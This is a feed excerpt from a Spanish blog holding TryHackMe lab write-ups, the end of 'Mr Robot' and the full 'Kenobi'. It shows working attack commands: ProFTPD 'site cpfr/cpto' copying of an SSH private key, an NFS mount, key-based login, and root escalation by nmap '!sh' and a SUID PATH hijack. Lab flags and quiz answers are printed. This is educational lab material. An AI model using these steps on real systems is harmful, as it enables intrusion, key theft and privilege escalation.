Welcome to Interactive Mode &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; press h &amp;lt;enter&amp;gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;help
&lt;/span&gt;nmap&amp;gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
&lt;span class=&quot;c&quot;&gt;# id&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ya somos usuarios &lt;em&gt;root&lt;/em&gt;, solo nos queda encontrar la &lt;em&gt;flag&lt;/em&gt; para completar la maquina&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cd root&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;root
&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;firstboot_done	key-3-of-3.txt
&lt;span class=&quot;c&quot;&gt;# cat key-3-of-3.txt&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-3-of-3.txt
x4x8xxxef27x3dee1ex161bx1x7xbxe4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;maquina-terminada&quot;&gt;Maquina terminada&lt;/h2&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">Basado en el programa Mr. Robot, ¿puedes rootear esta caja?</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.37.122
PING 10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.37.122&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.10.37.122: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;154 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.37.122 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 153.968/153.968/153.968/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como podemos ver, recibio el paquete enviado, ademas, mediante el &lt;em&gt;ttl&lt;/em&gt; podemos saber que es una maquina  &lt;em&gt;linux&lt;/em&gt;
tambien podemos usar la utilidad &lt;em&gt;wichSystem.py&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wichSystem.py 10.10.37.122

10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;fase-1-recoleción-de-información&quot;&gt;Fase 1: Recoleción de información&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/kenobi/allports.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Descripción de los parámetros:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;-p- : Escanea los puertos especificados, en este caso escanea los 65535 puertos.&lt;/li&gt;
  &lt;li&gt;-sS : Escanea TCP SYN&lt;/li&gt;
  &lt;li&gt;–min-rate: Envía paquetes no mas lentos que el número indicado por segundo en nuestro caso 5000.&lt;/li&gt;
  &lt;li&gt;–open: Muestra solo los puertos abiertos.&lt;/li&gt;
  &lt;li&gt;-vvv : Muestra la información mientras se esta realizando el escaneo.&lt;/li&gt;
  &lt;li&gt;-Pn : Omite el descubrimiento de host.&lt;/li&gt;
  &lt;li&gt;-n : No realiza resolución DNS.&lt;/li&gt;
  &lt;li&gt;ip: la ip que queremos escanear&lt;/li&gt;
  &lt;li&gt;-oG : Guarda la salida del escaneo en un formato grepeable (no sea util mas adelante)&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Scan the machine with nmap, how many ports are open&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;7&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;vemos que tenemos varios puertos abieros, pero nos fijamos primeramente en el port &lt;em&gt;80&lt;/em&gt; puesto que por &lt;em&gt;default&lt;/em&gt; es el usado 
para montar un servidor web&lt;/p&gt;

&lt;p&gt;-Solo esta una imagen, y no encontramos nada que nos sera muy util al momento&lt;/p&gt;

&lt;p&gt;utilizaremos la herramienta &lt;em&gt;gobuster&lt;/em&gt; para buscar posibles rutas en el servidor, mientas nos da un resultado seguimos estudiando
los puertos a ver que conseguimos&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/kenobi/gobuster.png&quot; alt=&quot;imagen gobuster&quot; /&gt;&lt;/p&gt;

&lt;p&gt;luego del escaneo con &lt;em&gt;gobuster&lt;/em&gt; vamos a la ruta &lt;em&gt;robots.txt&lt;/em&gt; que es la que nos llama la atencion&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Disallow: /admin.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;vamos la ruta que encontramos en &lt;em&gt;robots.txt&lt;/em&gt; pero no encontramos nada que nos llame la atencion.&lt;/p&gt;

&lt;h2 id=&quot;nmap--p-445-scriptsmb-enum-sharesnsesmb-enum-usersnse-1010210100&quot;&gt;nmap -p 445 –script=smb-enum-shares.nse,smb-enum-users.nse 10.10.210.100&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;using the nmap command, how many shares have been found?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;3&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;El comando anterior esta utilizando varios &lt;em&gt;scripts&lt;/em&gt; de nmap para intenter enumerar posibles usuarios&lt;/p&gt;

&lt;h2 id=&quot;obtenemos-acceso-anonymous-e-intentermos-descargar-el-archivo-logtxt-que-esta-en-el-directorio&quot;&gt;obtenemos acceso anonymous e intentermos descargar el archivo log.txt que esta en el directorio&lt;/h2&gt;

&lt;p&gt;Obtenemos esta respueta gracias a los escaneos que hemos hecho con nmap&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What port is FTP running on?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;21&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;estas-dos-soluciones-las-tenemos-previamente-con-el-escaneo-con-nmap&quot;&gt;Estas dos soluciones las tenemos previamente con el escaneo con nmap&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the version?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;1.3.5&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ahora vamos a buscar un &lt;em&gt;exploit&lt;/em&gt; para la version de &lt;em&gt;ProFTPD&lt;/em&gt; usando la herramienta &lt;em&gt;searchsploit&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;How many exploits are there for the ProFTPd running?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;3&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Nos conectaremos a la maquina usando &lt;em&gt;nc 10.10.98.8 21&lt;/em&gt; y usaremos los comandos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc 10.10.98.8 21
220 ProFTPD 1.3.5 Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ProFTPD Default Installation&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.98.8]
site cpfr /home/kenobi/.ssh/id_rsa 
350 File or directory exists, ready &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;destination name
site cpto /var/tmp/id_rsa
250 Copy successful
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ahora intentaremos realizar una montura en nuestra maquina de los archivos compartidos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;mnt
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; mount 10.10.98.8:/var mnt/
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;mnt/tmp/id_rsa &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ahora procederemos a copiar la &lt;em&gt;id_rsa&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;mnt/tmp/id_rsa &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;cambiamos los permisos a &lt;em&gt;id_rsa&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;procederemos a tratar de conectarnos usando la &lt;em&gt;id_rsa&lt;/em&gt; que obtuvimos anteriormente&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa kenobi@10.10.98.8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;al estar dentro de la maquina procedemos a buscar la &lt;em&gt;flag&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;share  user.txt
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
d0b0f3f53b6caa532a83915e19224899
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ahora que hemos encontrado la primer &lt;em&gt;flag&lt;/em&gt; pasamos a buscar la manera de ganar acceso como &lt;em&gt;superusuario&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/menu
/bin/su
/bin/ping6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;como podemos ver, tenemos varias archivos con permisos &lt;em&gt;SUID&lt;/em&gt;, pero nos llama la atencion el llamado &lt;em&gt;menu&lt;/em&gt;
ahora vamos a ver que funcion cumple el archivo y como nos podemos aprovechar&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;partimos de la premisa de que este archivo se ejecuta com permisos &lt;em&gt;SUID&lt;/em&gt;; Lo que intentaremos sera manipular el PATH para obtener
una &lt;em&gt;shell&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; /bin/sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl
kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;777 curl
kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;Creamos un archivo curl&lt;/li&gt;
  &lt;li&gt;le damos permisos&lt;/li&gt;
  &lt;li&gt;exportamos el path&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/menu

&lt;span class=&quot;k&quot;&gt;***************************************&lt;/span&gt;
1. status check
2. kernel version
3. ifconfig
&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; Enter your choice :1
 &lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ahora que somos &lt;em&gt;root&lt;/em&gt; solo nos queda encontrar la &lt;em&gt;flag&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cd root&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
root.txt
&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
root.txt
&lt;span class=&quot;c&quot;&gt;# cat root.txt&lt;/span&gt;
177b3cd8562289f37382721c28381f02
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="FTP" /><category term="SSH" /><category term="SUID" /><summary type="html">Tutorial sobre la explotación de una máquina Linux. Enumere Samba para compartir, manipule una versión vulnerable de proftpd y aumente sus privilegios con la manipulación de la variable de ruta.</summary></entry></feed>